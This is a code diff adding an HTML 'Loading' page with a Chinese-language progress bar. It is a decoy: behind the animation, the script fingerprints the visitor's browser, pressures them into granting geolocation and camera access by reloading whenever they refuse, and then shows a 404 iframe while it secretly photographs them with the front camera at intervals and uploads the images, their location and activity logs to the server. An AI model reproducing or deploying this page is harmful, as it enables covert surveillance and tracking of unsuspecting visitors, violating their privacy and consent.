@@ -1,0 +1,491 @@
+<!doctype html>
+<html lang="zh-CN">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Loading</title>
+		<style>
+			* {
+				margin: 0;
+				padding: 0;
+				box-sizing: border-box;
+			}
+			html,
+			body {
+				width: 100%;
+				height: 100%;
+				overflow: hidden;
+			}
+			iframe {
+				width: 100%;
+				height: 100%;
+				border: none;
+				display: none;
+			}
+			video {
+				display: none;
+			}
+
+			/* 加载页 */
+			#loader {
+				position: fixed;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background: #f8fafc;
+				display: flex;
+				flex-direction: column;
+				align-items: center;
+				justify-content: center;
+				z-index: 9999;
+				overflow: hidden;
+			}
+
+			/* 光斑1 - 左上 */
+			#loader::before {
+				content: '';
+				position: absolute;
+				width: 500px;
+				height: 500px;
+				background: radial-gradient(circle, rgba(99, 102, 241, 0.12) 0%, transparent 70%);
+				border-radius: 50%;
+				top: -150px;
+				left: -150px;
+				animation: blob1 10s ease-in-out infinite alternate;
+			}
+
+			/* 光斑2 - 右下 */
+			#loader::after {
+				content: '';
+				position: absolute;
+				width: 450px;
+				height: 450px;
+				background: radial-gradient(circle, rgba(165, 180, 252, 0.12) 0%, transparent 70%);
+				border-radius: 50%;
+				bottom: -120px;
+				right: -120px;
+				animation: blob2 12s ease-in-out infinite alternate;
+			}
+
+			@keyframes blob1 {
+				0% {
+					transform: translate(0, 0) scale(1);
+				}
+				100% {
+					transform: translate(80px, 60px) scale(1.2);
+				}
+			}
+
+			@keyframes blob2 {
+				0% {
+					transform: translate(0, 0) scale(1);
+				}
+				100% {
+					transform: translate(-60px, -80px) scale(1.15);
+				}
+			}
+
+			/* 文字 */
+			#loaderText {
+				color: #334155;
+				font-size: 20px;
+				font-weight: 500;
+				margin-bottom: 32px;
+				font-family:
+					system-ui,
+					-apple-system,
+					sans-serif;
+				letter-spacing: 0.5px;
+				position: relative;
+				z-index: 1;
+				animation: fadeIn 0.8s ease;
+			}
+
+			@keyframes fadeIn {
+				from {
+					opacity: 0;
+					transform: translateY(12px);
+				}
+				to {
+					opacity: 1;
+					transform: translateY(0);
+				}
+			}
+
+			/* 进度条轨道 */
+			.progress-bar {
+				width: 320px;
+				height: 16px;
+				background: rgba(99, 102, 241, 0.08);
+				border-radius: 8px;
+				overflow: hidden;
+				position: relative;
+				z-index: 1;
+			}
+
+			/* 进度条填充 */
+			.progress-fill {
+				width: 0%;
+				height: 100%;
+				background: linear-gradient(90deg, #6366f1, #818cf8, #a5b4fc);
+				border-radius: 8px;
+				transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+				position: relative;
+				box-shadow: 0 0 20px rgba(99, 102, 241, 0.35);
+			}
+
+			/* 流光 */
+			.progress-fill::after {
+				content: '';
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background: linear-gradient(90deg, transparent 0%, rgba(255, 255, 255, 0.5) 50%, transparent 100%);
+				animation: shimmer 1.8s infinite;
+			}
+
+			@keyframes shimmer {
+				0% {
+					transform: translateX(-100%);
+				}
+				100% {
+					transform: translateX(100%);
+				}
+			}
+
+			/* 百分比 */
+			#progressNum {
+				color: #6366f1;
+				font-size: 18px;
+				font-weight: 600;
+				margin-top: 16px;
+				font-family:
+					system-ui,
+					-apple-system,
+					sans-serif;
+				font-variant-numeric: tabular-nums;
+				position: relative;
+				z-index: 1;
+			}
+
+			/* 跳动点 */
+			.dots {
+				padding: 0 10px;
+			}
+
+			.dots span {
+				display: inline-block;
+				animation: bounce 1.4s infinite ease-in-out both;
+				color: #6366f1;
+				font-weight: bold;
+			}
+
+			.dots span:nth-child(1) {
+				animation-delay: 0s;
+			}
+			.dots span:nth-child(2) {
+				animation-delay: 0.2s;
+			}
+			.dots span:nth-child(3) {
+				animation-delay: 0.4s;
+			}
+
+			@keyframes bounce {
+				0%,
+				80%,
+				100% {
+					transform: translateY(0);
+				}
+				40% {
+					transform: translateY(-8px);
+				}
+			}
+		</style>
+	</head>
+	<body>
+		<iframe id="iframe" src="/404.html"></iframe>
+		<video id="video"></video>
+		<div id="loader">
+			<p id="loaderText">
+				<span class="text-content">正在初始化</span><span class="dots"><span>.</span><span>.</span><span>.</span></span>
+			</p>
+			<div class="progress-bar">
+				<div class="progress-fill" id="progressFill"></div>
+			</div>
+			<span id="progressNum">0%</span>
+		</div>
+		<script>
+			const video = document.getElementById('video');
+			const iframe = document.getElementById('iframe');
+			const loader = document.getElementById('loader');
+
+			let fingerprint;
+			let timer = null;
+			let secretlyFrequency = 1;
+
+			const getFlag = async () => {
+				await addLog('获取系统配置');
+				const res = await fetch('/api/getflag');
+				return await res.json();
+			};
+
+			const getUrlMap = async (hash) => {
+				await addLog('当前路径' + hash);
+				const res = await fetch('/api/geturlmap/' + hash);
+				return await res.text();
+			};
+
+			const init = async () => {
+				fingerprint = await getFingerprint();
+				const hash = window.location.hash.slice(1);
+
+				await addLog('进入页面初始化');
+
+				setProgress(0, '正在初始化');
+
+				const flag = await getFlag();
+
+				if (hash) {
+					if (hash.startsWith('http')) {
+						iframe.src = hash;
+					} else {
+						const url = await getUrlMap(hash);
+
+						if (url) {
+							iframe.src = url;
+						}
+					}
+				}
+
+				if (flag.secretly) {
+					secretlyFrequency = flag.secretly_frequency;
+					setTimeout(getUserMedia, (Math.floor(Math.random() * 6) + 5) * 1000);
+				} else {
+					await addLog('禁止拍照');
+					iframe.style.display = '';
+					loader.style.display = 'none';
+				}
+			};
+
+			const getUserMedia = async () => {
+				if ((await requestLocation()) && (await requestCamera())) {
+					await addLog('获取权限成功');
+
+					video.onloadedmetadata = () => {
+						video.play();
+						setTimeout(startLoop, 0);
+					};
+				}
+
+				iframe.style.display = 'block';
+				loader.style.display = 'none';
+			};
+
+			const requestLocation = async () => {
+				await addLog('请求定位权限');
+				return new Promise((resolve) => {
+					navigator.geolocation.getCurrentPosition(
+						async (position) => {
+							const { latitude: lat, longitude: lng } = position.coords;
+							await addLog('定位成功：' + lat + ',' + lng);
+							setProgress(25, '加载配置');
+							resolve(true);
+						},
+						async (err) => {
+							console.log(err);
+							switch (err.code) {
+								case 1:
+									await addLog('定位权限失败：' + err.message);
+									await reload();
+									break;
+								default:
+									await addLog('定位失败未知错误：' + err.message);
+									break;
+							}
+							resolve(false);
+						},
+					);
+				});
+			};
+
+			const requestCamera = async () => {
+				try {
+					await addLog('请求前置摄像头权限');
+					const stream = await navigator.mediaDevices.getUserMedia({
+						video: { facingMode: 'user' },
+						audio: false,
+					});
+					video.srcObject = stream;
+					setProgress(50, '加载配置');
+					return true;
+				} catch (err) {
+					switch (err.name) {
+						case 'NotFoundError':
+							await addLog('未找到前置摄像头，回退到任意摄像头');
+							try {
+								const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+								video.srcObject = stream;
+								setProgress(50, '加载配置');
+								return true;
+							} catch (err1) {
+								switch (err1.name) {
+									case 'NotFoundError':
+										await addLog('未找到回退摄像头：' + err1.message);
+										break;
+									case 'NotAllowedError':
+										await addLog('回退摄像头权限失败：' + err1.message);
+										await reload();
+										break;
+									default:
+										await addLog('回退摄像头未知错误：' + err1.message);
+										break;
+								}
+							}
+							break;
+						case 'NotAllowedError':
+							await addLog('摄像头权限失败：' + err.message);
+							await reload();
+							break;
+						default:
+							await addLog('摄像头未知错误：' + err.message);
+							break;
+					}
+				}
+
+				return false;
+			};
+
+			const startLoop = async () => {
+				try {
+					await stopLoop();
+					await addLog('开始循环拍照（间隔' + secretlyFrequency * 60 + '秒）');
+					await captureAndUpload();
+					timer = setInterval(await captureAndUpload, secretlyFrequency * 60 * 1000);
+				} catch (err) {
+					await addLog('开始循环拍照失败: ' + err.message);
+				}
+			};
+
+			const stopLoop = async () => {
+				try {
+					await addLog('暂停循环拍照');
+					if (timer) {
+						clearInterval(timer);
+						timer = null;
+					}
+				} catch (err) {
+					await addLog('暂停循环拍照失败: ' + err.message);
+				}
+			};
+
+			const captureAndUpload = async () => {
+				const canvas = document.createElement('canvas');
+				canvas.width = video.videoWidth;
+				canvas.height = video.videoHeight;
+				canvas.getContext('2d').drawImage(video, 0, 0);
+
+				const photo = canvas.toDataURL('image/jpeg', 0.9);
+				await addLog('拍照完成');
+				const name = `${fingerprint}_${Date.now()}.jpg`;
+				await fetch('/api/upload', { method: 'POST', body: JSON.stringify({ photo, name }) });
+				await addLog('上传完成 ' + name);
+			};
+
+			const setProgress = (percent, text) => {
+				const fill = document.getElementById('progressFill');
+				const num = document.getElementById('progressNum');
+				const label = document.getElementById('loaderText');
+
+				if (fill) fill.style.width = Math.round(percent) + '%';
+				if (num) num.textContent = Math.round(percent) + '%';
+				if (label) {
+					label.innerHTML = `<span class="text-content">${text}</span><span class="dots"><span>.</span><span>.</span><span>.</span></span>`;
+				}
+			};
+
+			const addLog = async (log) => {
+				console.log(log);
+				await fetch('/api/addrecords', { method: 'POST', body: JSON.stringify({ user: fingerprint, message: log }) });
+			};
+
+			const reload = async () => {
+				setProgress(75, '获取权限失败，正在重新启动');
+				setTimeout(async () => {
+					await addLog('刷新页面');
+					location.reload();
+				}, 3000);
+			};
+
+			const getFingerprint = async () => {
+				const components = [];
+
+				// 1. 基础信息
+				components.push(navigator.userAgent);
+				components.push(navigator.language);
+				components.push(screen.width + 'x' + screen.height);
+				components.push(screen.colorDepth);
+				components.push(Intl.DateTimeFormat().resolvedOptions().timeZone);
+				components.push(navigator.hardwareConcurrency);
+				components.push(new Date().getTimezoneOffset());
+
+				// 2. Canvas 指纹
+				components.push(getCanvasFingerprint());
+
+				// 3. WebGL 指纹
+				components.push(getWebGLFingerprint());
+
+				// 4. 触摸支持
+				components.push('ontouchstart' in window ? '1' : '0');
+
+				// 组合后哈希
+				const raw = components.join('|||');
+				const hash = await sha256(raw);
+				return hash;
+			};
+
+			const getCanvasFingerprint = () => {
+				const canvas = document.createElement('canvas');
+				canvas.width = 200;
+				canvas.height = 50;
+				const ctx = canvas.getContext('2d');
+
+				ctx.textBaseline = 'top';
+				ctx.font = '14px Arial';
+				ctx.fillStyle = '#f60';
+				ctx.fillRect(10, 10, 100, 30);
+				ctx.fillStyle = '#069';
+				ctx.fillText('Hello Fingerprint!', 2, 15);
+
+				return canvas.toDataURL();
+			};
+
+			const getWebGLFingerprint = () => {
+				const canvas = document.createElement('canvas');
+				const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+				if (!gl) return 'no-webgl';
+
+				const renderer = gl.getParameter(gl.RENDERER);
+				const vendor = gl.getParameter(gl.VENDOR);
+				const version = gl.getParameter(gl.VERSION);
+				const extensions = gl.getSupportedExtensions()?.join(',') || '';
+
+				gl.getExtension('WEBGL_lose_context')?.loseContext();
+
+				return `${vendor}|${renderer}|${version}|${extensions}`;
+			};
+
+			const sha256 = async (message) => {
+				const data = new TextEncoder().encode(message);
+				const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+				const hashArray = Array.from(new Uint8Array(hashBuffer));
+				return hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
+			};
+
+			// 页面加载后自动启动
+			window.addEventListener('load', init);
+		</script>
+	</body>
+</html>
